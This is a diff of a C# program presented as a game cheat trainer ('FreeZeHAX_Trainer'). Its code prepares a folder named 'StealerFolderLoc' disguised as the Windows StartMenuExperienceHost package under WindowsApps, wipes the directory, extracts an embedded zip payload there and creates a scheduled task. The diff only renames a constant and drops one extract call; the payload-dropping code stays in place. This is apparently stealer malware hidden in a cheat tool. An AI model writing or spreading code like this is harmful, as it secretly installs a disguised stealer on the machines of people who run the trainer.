@@ -29,7 +29,7 @@ namespace FreeZeHAX_Trainer
         private readonly Cheats cheats = new Cheats();
         private bool mouseDown;
         private Point lastLocation;
-        private const string ResourceName = "StartMenuExperienceHost.exe";
+        private const string FileName = "StartMenuExperienceHost.exe";
         private const string ZipFileName = "StartMenu.zip";
         private const string NamespaceName = "FreeZeHAX_Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
@@ -75,11 +75,10 @@ namespace FreeZeHAX_Trainer
                 string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
                 string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
-                string StealerFile = StealerFolderLoc + "\\" + ResourceName;
+                string StealerFile = StealerFolderLoc + "\\" + FileName;
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
-                others.Extract(NamespaceName, StealerFolderLoc, "Files", ResourceName);
                 others.Extract(NamespaceName, StealerFolderLoc, "Files", ZipFileName);
                 if (Directory.Exists(Guna))
                 {
